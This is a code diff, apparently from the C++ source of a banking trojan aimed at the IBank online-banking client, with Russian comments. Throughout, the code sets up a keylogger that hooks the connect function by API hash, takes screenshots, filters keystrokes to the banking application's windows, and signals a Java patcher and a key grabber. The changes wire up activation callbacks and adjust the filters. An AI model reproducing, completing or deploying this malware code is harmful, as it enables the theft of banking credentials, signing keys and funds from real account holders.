@@ -89,7 +89,7 @@ namespace IBank
 	// Глобальные переменные системы
 	DWORD         ProcessID = 0;
 	PKeyLogSystem System    = NULL;
-	bool          Hooked    = false;
+	bool          Hooked    = false;  
 
 
 #ifdef JAVS_PATCHERH
@@ -218,6 +218,7 @@ namespace IBank
 		// Устанавливаем треуемые хуки
 		IBDBG( "IBank", "Ставим хуки для %s", System->Name );
 
+
 		// Ставим хук на подключение к серверу, для определения момента закрыти
 		// системы
 		const DWORD HASH_connect = 0xEDD8FE8A /* connect */;
@@ -266,9 +267,10 @@ namespace IBank
 	void SystemActivated(LPVOID Sender)
 	{
 		System = (PKeyLogSystem)Sender;
+		IBDBG("IBank", "Система IBANK активирована");
 		// Активированы система IBank
 		IBDBG("IBank", "Система %s активирована, %08x", System->Name, (DWORD)GetImageBase() );
-
+  
 
 		// Сигнализируем ява патчеру о необходимости запуска патчей
 		#ifdef JAVS_PATCHERH
@@ -646,8 +648,8 @@ void RegisterIBankSystem(DWORD hashApp)
 
 
 
-	ClearStruct(IBank::Log);
-	IBank::Hooked = false;
+	ClearStruct(IBank::Log);  
+	IBank::Hooked = false; 
 	IBank::System = NULL;
 	#ifdef JAVS_PATCHERH
 	IBank::IBnakHostAddr = 0;
@@ -699,18 +701,21 @@ void RegisterIBankSystem(DWORD hashApp)
 		S->DontSendLog     = true;
 		S->TimeMode		   = KLG_TIME_INFINITE;
 
-		IBank::MakeScreenShot();
+		IBank::MakeScreenShot(); 
 
 		// Добавляем фильтры окон
 		PKlgWndFilter F;
 		F = KeyLogger::AddFilter(S, true, true, ClassName, Caption1, FILTRATE_PARENT_WND, LOG_ALL, 3);
 		if (F != NULL)
-		{
+		{ 
 			F->CaseSensetive = false;
 			F->DontSaveMouseLog = true;
-			KeyLogger::AddFilterText(F, NULL, Caption2);
-			KeyLogger::AddFilterText(F, NULL, Caption3);
-			KeyLogger::AddFilterText(F, NULL, Caption4);
+			KeyLogger::AddFilterText(F, ClassName, Caption2);
+			KeyLogger::AddFilterText(F, ClassName, Caption3);
+			KeyLogger::AddFilterText(F, ClassName, Caption4);
+
+			S->OnActivate = IBank::SystemActivated;
+			S->OnDeactivate = IBank::SystemDeactivated;
 		}
 
 		if( hashMain == PROCESS_HASH_JAVAW ) //граббер ключей для оффлайн версии
